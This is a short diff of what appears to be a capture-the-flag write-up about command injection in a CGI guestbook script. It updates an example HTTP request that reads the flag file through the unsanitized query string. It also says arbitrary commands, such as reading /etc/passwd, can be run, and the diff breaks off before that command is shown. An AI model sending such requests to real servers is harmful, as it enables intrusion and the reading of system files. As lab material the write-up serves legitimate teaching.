@@ -13,10 +13,10 @@ The query string is not sanitized, so any shell metacharacters are interpreted b
 
 ## Exploitation
 
-To read the flag file at `/flag.txt`:
+To read the flag file at `/flag/flag`:
 
 ```
-GET /cgi-bin/guestbook.pl?/flag.txt HTTP/1.0
+GET /cgi-bin/guestbook.pl?/flag/flag HTTP/1.0
 ```
 
 Or to run arbitrary commands (e.g., read `/etc/passwd`):
